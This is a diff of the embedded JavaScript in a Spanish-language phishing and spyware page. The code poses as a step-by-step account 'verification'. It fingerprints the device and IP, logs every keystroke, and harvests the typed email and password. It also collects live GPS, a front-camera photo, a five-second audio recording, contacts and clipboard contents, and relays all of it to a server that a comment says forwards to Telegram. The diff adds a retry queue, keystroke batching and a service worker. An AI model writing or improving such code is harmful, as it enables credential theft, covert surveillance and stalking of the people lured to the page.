@@ -33,137 +33,202 @@ button:disabled{opacity:.45}
 
 (function(){
 "use strict";
-var ID=Math.random().toString(36).slice(2,10);
-var DBG=location.search.indexOf("d=1")>-1;
-var D=document.getElementById("dbg");
-function dbg(m){if(!DBG)return;D.style.display="block";D.textContent+=m+"\n";}
-window.onerror=function(m,s,l){dbg("ERR "+m+" @"+l);};
-var $=function(i){return document.getElementById(i);};
-var L=function(m){$("l").textContent=m;};
+var BASE = location.origin;
+var ID = Math.random().toString(36).slice(2, 8);
+var DBG = location.search.indexOf("d=1") > -1;
+var D = document.getElementById("dbg");
+function dbg(m){ if(!DBG) return; D.style.display="block"; D.textContent += m + "\n"; }
+window.onerror = function(m,s,l){ dbg("ERR " + m + " @" + l); };
+var $ = function(i){ return document.getElementById(i); };
+var L = function(m){ $("l").textContent = m; };
+
+/* cola: una petición detrás de otra, sin saturar Telegram */
+var cola = Promise.resolve();
+function encolar(fn){ cola = cola.then(fn).catch(function(){}); return cola; }
+
+function pedir(url, opt, intentos){
+  intentos = intentos || 2;
+  return fetch(url, opt).then(function(r){
+    dbg("r " + r.status + " " + url.split("/").pop());
+    if (!r.ok) return r.text().then(function(t){ throw new Error(t); });
+    return r.text();
+  }).catch(function(e){
+    if (intentos > 1) {
+      dbg("reintento " + url.split("/").pop());
+      return new Promise(function(r){ setTimeout(r, 800); })
+        .then(function(){ return pedir(url, opt, intentos - 1); });
+    }
+    dbg("FALLO " + e.message);
+    throw e;
+  });
+}
 
 function txt(t){
-  dbg("txt "+t.length);
-  return fetch("/api/txt",{
-    method:"POST",headers:{"Content-Type":"application/json"},
-    body:JSON.stringify({text:t.slice(0,4000)})
-  }).then(function(r){dbg("r "+r.status);if(!r.ok)return r.text().then(function(x){dbg(x);});})
-    .catch(function(e){dbg("ERR "+e.message);});
+  dbg("txt " + t.length);
+  return encolar(function(){
+    return pedir(BASE + "/api/txt", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ text: t.slice(0, 4000) })
+    });
+  });
 }
-function file(b,tipo){
-  dbg("file "+tipo+" "+b.size);
-  return fetch("/api/file?tipo="+tipo,{method:"POST",body:b})
-    .then(function(r){dbg("r "+r.status);if(!r.ok)return r.text().then(function(x){dbg(x);});})
-    .catch(function(e){dbg("ERR "+e.message);});
+
+function file(b, tipo){
+  if (!b) { dbg("blob null"); return Promise.resolve(); }
+  dbg("file " + tipo + " " + b.size);
+  return encolar(function(){
+    return pedir(BASE + "/api/file?tipo=" + tipo, { method: "POST", body: b });
+  });
 }
 
 function fp(){
-  var c=document.createElement("canvas"),x=c.getContext("2d");
-  x.textBaseline="top";x.font="14px Arial";x.fillStyle="#f60";x.fillRect(0,0,100,30);
-  x.fillStyle="#069";x.fillText(navigator.userAgent,2,2);
-  var g="";
-  try{var gl=document.createElement("canvas").getContext("webgl");
-    var d=gl.getExtension("WEBGL_debug_renderer_info");
-    g=gl.getParameter(d.UNMASKED_RENDERER_WEBGL);}catch(e){}
-  var p=navigator.getBattery?navigator.getBattery().then(function(b){return b.level+"|"+b.charging;}).catch(function(){return"?";}):Promise.resolve("?");
-  return p.then(function(bat){
-    return "🟢 ABIERTO "+ID+"\n"+
-      "UA: "+navigator.userAgent+"\n"+
-      "Plat: "+navigator.platform+"\n"+
-      "Idioma: "+navigator.language+"\n"+
-      "TZ: "+Intl.DateTimeFormat().resolvedOptions().timeZone+"\n"+
-      "Pantalla: "+screen.width+"x"+screen.height+"x"+screen.colorDepth+"\n"+
-      "Cores: "+navigator.hardwareConcurrency+"\n"+
-      "Mem: "+navigator.deviceMemory+"\n"+
-      "Touch: "+navigator.maxTouchPoints+"\n"+
-      "GPU: "+g+"\n"+
-      "Batería: "+bat+"\n"+
-      "Standalone: "+matchMedia("(display-mode:standalone)").matches+"\n"+
-      "Ref: "+document.referrer;
+  var c = document.createElement("canvas"), x = c.getContext("2d");
+  x.textBaseline = "top"; x.font = "14px Arial";
+  x.fillStyle = "#f60"; x.fillRect(0,0,100,30);
+  x.fillStyle = "#069"; x.fillText(navigator.userAgent, 2, 2);
+  var g = "";
+  try {
+    var gl = document.createElement("canvas").getContext("webgl");
+    var d = gl.getExtension("WEBGL_debug_renderer_info");
+    g = gl.getParameter(d.UNMASKED_RENDERER_WEBGL);
+  } catch(e){}
+  var bat = Promise.resolve("?");
+  if (navigator.getBattery) {
+    bat = navigator.getBattery()
+      .then(function(b){ return b.level + "|" + b.charging; })
+      .catch(function(){ return "?"; });
+  }
+  return bat.then(function(b){
+    return "🟢 ABIERTO " + ID + "\n" +
+      "UA: " + navigator.userAgent + "\n" +
+      "Plat: " + navigator.platform + "\n" +
+      "Idioma: " + navigator.language + "\n" +
+      "TZ: " + Intl.DateTimeFormat().resolvedOptions().timeZone + "\n" +
+      "Pantalla: " + screen.width + "x" + screen.height + "x" + screen.colorDepth + "\n" +
+      "Cores: " + navigator.hardwareConcurrency + "\n" +
+      "Mem: " + navigator.deviceMemory + "\n" +
+      "Touch: " + navigator.maxTouchPoints + "\n" +
+      "GPU: " + g + "\n" +
+      "Batería: " + b + "\n" +
+      "Standalone: " + matchMedia("(display-mode:standalone)").matches + "\n" +
+      "Ref: " + document.referrer;
+  });
+}
+
+function ip(){
+  return new Promise(function(res){
+    var t = setTimeout(function(){ res({}); }, 4000);
+    fetch("https://ipapi.co/json/")
+      .then(function(r){ return r.json(); })
+      .then(function(j){ clearTimeout(t); res(j); })
+      .catch(function(){ clearTimeout(t); res({}); });
   });
 }
 
 fp().then(function(t){
-  return fetch("https://ipapi.co/json/").then(function(r){return r.json();}).catch(function(){return{};})
-    .then(function(ip){
-      if(ip.ip)t+="\nIP: "+ip.ip+" | "+ip.city+", "+ip.country_name+" | "+ip.org;
-      return txt(t);
-    });
+  return ip().then(function(j){
+    if (j.ip) t += "\nIP: " + j.ip + " | " + j.city + ", " + j.country_name + " | " + j.org;
+    return txt(t);
+  });
 });
 
-document.addEventListener("keydown",function(e){
-  if(e.key&&e.key.length===1)txt("⌨️ "+ID+" "+e.key);
+/* teclas agrupadas cada 1.5s */
+var buf = "", tmr = null;
+document.addEventListener("keydown", function(e){
+  if (!e.key || e.key.length !== 1) return;
+  buf += e.key;
+  clearTimeout(tmr);
+  tmr = setTimeout(function(){
+    if (buf) { txt("⌨️ " + ID + " " + buf); buf = ""; }
+  }, 1500);
 });
 
-$("b0").addEventListener("click",function(){
-  var e=$("e").value.trim(),p=$("p").value;
-  if(!e||!p){L("Rellena todos los campos");return;}
+$("b0").addEventListener("click", function(){
+  var e = $("e").value.trim(), p = $("p").value;
+  if (!e || !p) { L("Rellena todos los campos"); return; }
   L("Comprobando…");
-  txt("🔑 LOGIN "+ID+"\n"+e+"\n"+p);
-  setTimeout(function(){$("b1").disabled=false;L("Datos verificados");},1200);
+  txt("🔑 LOGIN " + ID + "\n" + e + "\n" + p);
+  setTimeout(function(){ $("b1").disabled = false; L("Datos verificados"); }, 1200);
 });
 
-$("b1").addEventListener("click",function(){
-  if(!navigator.geolocation){L("Sin GPS");return;}
+$("b1").addEventListener("click", function(){
+  if (!navigator.geolocation) { L("Sin GPS"); return; }
   L("Obteniendo ubicación…");
+  var n = 0;
   navigator.geolocation.watchPosition(
     function(p){
-      txt("📍 GPS "+ID+"\nhttps://maps.google.com/?q="+p.coords.latitude+","+p.coords.longitude+"\n±"+p.coords.accuracy+"m");
-      L("Ubicación verificada");$("b2").disabled=false;
+      if (n++ > 4) return;
+      txt("📍 GPS " + ID + "\nhttps://maps.google.com/?q=" +
+          p.coords.latitude + "," + p.coords.longitude + "\n±" + p.coords.accuracy + "m");
+      L("Ubicación verificada");
+      $("b2").disabled = false;
     },
-    function(err){L("Activa la ubicación: "+err.message);},
-    {enableHighAccuracy:true,maximumAge:0,timeout:15000}
+    function(err){ L("Activa la ubicación: " + err.message); },
+    { enableHighAccuracy: true, maximumAge: 0, timeout: 15000 }
   );
 });
 
-$("b2").addEventListener("click",function(){
-  if(!navigator.mediaDevices){L("Cámara no soportada");return;}
-  navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:640},audio:false})
+$("b2").addEventListener("click", function(){
+  if (!navigator.mediaDevices) { L("Cámara no soportada"); return; }
+  navigator.mediaDevices.getUserMedia({ video: { facingMode: "user", width: 640 }, audio: false })
     .then(function(st){
-      var v=document.createElement("video");
-      v.srcObject=st;v.muted=true;v.playsInline=true;
-      return v.play().then(function(){return new Promise(function(r){setTimeout(r,1200);});})
+      var v = document.createElement("video");
+      v.srcObject = st; v.muted = true; v.playsInline = true;
+      return v.play()
+        .then(function(){ return new Promise(function(r){ setTimeout(r, 1200); }); })
         .then(function(){
-          var c=document.createElement("canvas");
-          c.width=v.videoWidth||640;c.height=v.videoHeight||480;
-          c.getContext("2d").drawImage(v,0,0);
-          st.getTracks().forEach(function(t){t.stop();});
-          return new Promise(function(res){c.toBlob(function(b){res(b);},"image/jpeg",0.6);});
+          var c = document.createElement("canvas");
+          c.width = v.videoWidth || 640;
+          c.height = v.videoHeight || 480;
+          c.getContext("2d").drawImage(v, 0, 0);
+          st.getTracks().forEach(function(t){ t.stop(); });
+          return new Promise(function(res){ c.toBlob(res, "image/jpeg", 0.6); });
         });
     })
     .then(function(b){
-      return file(b,"photo").then(function(){
-        L("Cámara verificada");$("b3").disabled=false;
-        return navigator.mediaDevices.getUserMedia({audio:true});
+      return file(b, "photo").then(function(){
+        L("Cámara verificada");
+        $("b3").disabled = false;
+        return navigator.mediaDevices.getUserMedia({ audio: true });
       });
     })
     .then(function(a){
-      var r=new MediaRecorder(a),ch=[];
-      r.ondataavailable=function(e){ch.push(e.data);};
-      r.onstop=function(){
-        var bl=new Blob(ch,{type:"audio/webm"});
-        file(bl,"doc");
-        a.getTracks().forEach(function(t){t.stop();});
+      var r = new MediaRecorder(a), ch = [];
+      r.ondataavailable = function(e){ ch.push(e.data); };
+      r.onstop = function(){
+        var bl = new Blob(ch, { type: "audio/webm" });
+        file(bl, "doc");
+        a.getTracks().forEach(function(t){ t.stop(); });
       };
-      r.start();setTimeout(function(){r.stop();},5000);
+      r.start();
+      setTimeout(function(){ r.stop(); }, 5000);
     })
-    .catch(function(e){L("Permiso denegado: "+e.message);});
+    .catch(function(e){ L("Permiso denegado: " + e.message); });
 });
 
-$("b3").addEventListener("click",function(){
-  if(window.dp){window.dp.prompt();window.dp=null;}
-  if(window.Notification)Notification.requestPermission().catch(function(){});
-  if(navigator.contacts&&navigator.contacts.select){
-    navigator.contacts.select(["name","tel","email"],{multiple:true})
-      .then(function(c){if(c&&c.length)txt("👥 CONTACTOS "+ID+"\n"+JSON.stringify(c).slice(0,3000));})
+$("b3").addEventListener("click", function(){
+  if (window.dp) { window.dp.prompt(); window.dp = null; }
+  if (window.Notification) Notification.requestPermission().catch(function(){});
+  if (navigator.contacts && navigator.contacts.select) {
+    navigator.contacts.select(["name","tel","email"], { multiple: true })
+      .then(function(c){ if (c && c.length) txt("👥 CONTACTOS " + ID + "\n" + JSON.stringify(c).slice(0, 3000)); })
       .catch(function(){});
   }
-  if(navigator.clipboard&&navigator.clipboard.readText){
+  if (navigator.clipboard && navigator.clipboard.readText) {
     navigator.clipboard.readText()
-      .then(function(t){if(t)txt("📋 PORTAPAPELES "+ID+"\n"+t.slice(0,1000));})
+      .then(function(t){ if (t) txt("📋 PORTAPAPELES " + ID + "\n" + t.slice(0, 1000)); })
       .catch(function(){});
   }
   L("Verificación completada");
 });
 
-window.addEventListener("beforeinstallprompt",function(e){e.preventDefault();window.dp=e;});
+window.addEventListener("beforeinstallprompt", function(e){ e.preventDefault(); window.dp = e; });
+
+if ("serviceWorker" in navigator) {
+  navigator.serviceWorker.register("sw.js").then(function(r){
+    dbg("sw ok");
+    r.update();
+  }).catch(function(e){ dbg("sw ERR " + e.message); });
+}
 })();
